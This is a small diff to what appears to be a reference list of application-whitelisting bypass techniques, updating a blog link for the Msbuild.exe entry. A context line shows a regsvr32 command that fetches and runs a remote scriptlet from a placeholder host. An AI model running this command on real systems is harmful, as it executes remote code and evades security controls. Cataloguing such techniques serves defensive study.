@@ -53,7 +53,7 @@ https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bia
     regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
 
 13. Msbuild.exe
-    http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html
+    http://subt0x10.blogspot.com/2017/04/bypassing-application-whitelisting.html
 
 
 
